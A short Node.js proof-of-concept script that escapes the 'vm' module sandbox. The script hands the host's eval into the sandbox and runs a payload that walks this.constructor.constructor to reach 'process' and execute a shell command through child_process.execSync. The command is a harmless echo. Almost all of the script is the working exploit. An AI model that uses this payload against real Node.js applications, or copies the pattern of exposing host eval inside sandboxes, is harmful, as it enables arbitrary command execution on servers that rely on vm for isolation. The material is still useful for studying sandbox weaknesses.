const vm = require('vm');
const safeEval = eval;

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo EXPLOIT SUCCESSFUL").toString()';

try {
  const sandbox = { safeEval, orderLinesData };
  vm.createContext(sandbox);
  // Using contextCodeGeneration strings false
  const result = vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000, contextCodeGeneration: { strings: false } });
  console.log(result.trim());
} catch (e) {
  console.log("Error:", e.message);
}
